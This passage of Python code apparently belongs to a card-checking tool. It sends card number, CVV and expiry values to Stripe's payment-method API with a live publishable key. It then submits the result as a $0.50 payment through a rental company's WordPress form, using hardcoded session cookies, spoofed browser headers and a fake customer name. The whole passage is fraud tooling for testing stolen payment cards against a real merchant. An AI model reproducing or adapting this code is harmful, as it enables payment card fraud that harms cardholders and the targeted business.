    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fee4145ae1a%3B+stripe-js-v3%2Fee4145ae1a%3B+card-element&referrer=https%3A%2F%2Fcgnrentals.com&time_on_page={time_on_page}&key=pk_live_51MHxOaCGSG6F5CDpOv0O1mnr1gfWRhwIg9nQnX8qT6oJneH4lt50ErVpMlnhJ6HY6m1tHMRrhGyBwNQG72c0XUjP00asdG3DKI'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:     
            id = response.json()['id']
        except:
            pass


        cookies = {
    'PHPSESSID': '28550b1eab43933d553c044f3eaeab98',
    '_ga': 'GA1.1.1849041944.1729420977',
    '_fbp': 'fb.1.1729420977595.186803745800016012',
    '__stripe_mid': 'bdd9b610-080a-48da-8771-c2be2e55040d32a4df',
    '__stripe_sid': '63d90791-5006-4a7a-9711-767496e899d25c212b',
    '_ga_VCPW9JLZ3V': 'GS1.1.1729420977.1.1.1729421048.0.0.0',
    '_gcl_au': '1.1.444346116.1729420976.350273367.1729421041.1729421049',
}

        headers = {
    'authority': 'cgnrentals.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=28550b1eab43933d553c044f3eaeab98; _ga=GA1.1.1849041944.1729420977; _fbp=fb.1.1729420977595.186803745800016012; __stripe_mid=bdd9b610-080a-48da-8771-c2be2e55040d32a4df; __stripe_sid=63d90791-5006-4a7a-9711-767496e899d25c212b; _ga_VCPW9JLZ3V=GS1.1.1729420977.1.1.1729421048.0.0.0; _gcl_au=1.1.444346116.1729420976.350273367.1729421041.1729421049',
    'origin': 'https://cgnrentals.com',
    'referer': 'https://cgnrentals.com/payments/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1729421049789',
}

        data = {
    'data': f'__fluent_form_embded_post_id=272&_fluentform_3_fluentformnonce=73d21d956f&_wp_http_referer=%2Fpayments%2F&custom-payment-amount=0.50&payment_method=stripe&names%5Bfirst_name%5D=thu&names%5Bmiddle_name%5D=&names%5Blast_name%5D=ra&email={mail}&phone=%2B18172388000&dropdown=Vehicles&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '3',
}

        r6 = requests.post(
    'https://cgnrentals.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data
)
        return (r6.json())